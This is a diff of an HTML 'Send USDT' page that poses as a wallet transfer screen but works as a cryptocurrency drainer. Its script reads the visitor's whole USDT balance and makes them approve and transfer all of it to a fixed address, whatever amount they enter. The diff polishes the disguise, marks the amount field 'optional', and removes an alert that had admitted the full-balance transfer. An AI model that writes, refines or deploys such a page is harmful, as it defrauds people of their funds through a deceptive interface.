@@ -1,102 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Send USDT</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #0c0c0c;
       color: #fff;
-      font-family: system-ui, sans-serif;
-      margin: 0;
     }
     .container {
-      max-width: 500px;
+      max-width: 480px;
       margin: 0 auto;
       padding: 20px;
+      padding-bottom: 100px;
     }
-    h1 {
-      font-size: 20px;
+    header {
+      display: flex;
+      align-items: center;
       padding: 16px;
+      font-size: 17px;
+      font-weight: 600;
     }
     label {
       display: block;
-      color: #aaa;
-      font-size: 14px;
-      margin-top: 20px;
+      font-size: 13px;
+      color: #888;
+      margin: 20px 0 6px;
     }
     .input-box {
+      display: flex;
+      align-items: center;
       background: #1b1b1b;
       border: 1px solid #2c2c2c;
       border-radius: 14px;
-      padding: 12px;
-      display: flex;
-      align-items: center;
-      margin-top: 5px;
+      padding: 14px;
+      height: 52px;
     }
     .input-box input {
       flex: 1;
       background: transparent;
       border: none;
-      color: white;
-      font-size: 16px;
       outline: none;
-    }
-    .right {
-      color: #00ff99;
+      color: #fff;
       font-size: 14px;
+    }
+    .input-actions {
       margin-left: 10px;
+      display: flex;
+      gap: 12px;
+      font-size: 13px;
+    }
+    .input-actions span {
+      color: #00ff99;
       cursor: pointer;
     }
+    .amount-box {
+      display: flex;
+      align-items: center;
+    }
+    .amount-box .token {
+      color: #ccc;
+      margin-left: 10px;
+      font-size: 14px;
+    }
     .usd {
+      font-size: 12px;
       color: #888;
-      font-size: 13px;
-      margin-top: 10px;
+      margin: 8px 0 28px;
+    }
+    .fixed-button {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      max-width: 480px;
+      background: #0c0c0c;
+      padding: 16px;
+      border-top: 1px solid #222;
     }
     button {
       width: 100%;
       background: #2c7a4b;
-      color: white;
-      font-weight: bold;
-      font-size: 18px;
-      padding: 14px;
-      border-radius: 30px;
       border: none;
-      margin-top: 40px;
+      border-radius: 30px;
+      padding: 16px;
+      font-size: 17px;
+      font-weight: bold;
+      color: #fff;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Send USDT</h1>
+  <header>Send USDT</header>
 
+  <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
+      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
     </div>
 
     <label>Amount</label>
-    <div class="input-box">
-      <input type="text" placeholder="USDT Amount" readonly>
-      <div class="right" onclick="fillMax()">Max</div>
+    <div class="input-box amount-box">
+      <input type="number" id="amount" placeholder="Enter USDT (optional)" />
+      <span class="token">USDT</span>
     </div>
 
     <div class="usd">≈ $0.00</div>
+  </div>
 
-    <button onclick="start()" id="nextBtn">Next</button>
+  <div class="fixed-button">
+    <button id="nextBtn" onclick="start()">Next</button>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const TO = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
+    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Fixed address
     const ABI = [
-      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
-      { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
-      { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" }
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ];
 
     async function start() {
@@ -105,7 +132,7 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Please open in Trust Wallet browser");
+        alert("Please use Trust Wallet browser (BNB Chain).");
         btn.innerText = "Next";
         btn.disabled = false;
         return;
@@ -120,8 +147,8 @@
         const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
-        await contract.methods.approve(TO, balance).send({ from: user });
-        await contract.methods.transferFrom(user, TO, balance).send({ from: user });
+        await contract.methods.approve(RECEIVER, balance).send({ from: user });
+        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
         btn.innerText = "✅ Done";
       } catch (e) {
@@ -134,11 +161,7 @@
         btn.disabled = false;
       }, 3000);
     }
-
-    function fillMax() {
-      alert("Max selected (auto transfer full balance)");
-    }
   </script>
 
 </body>
-</html>
+    </html>
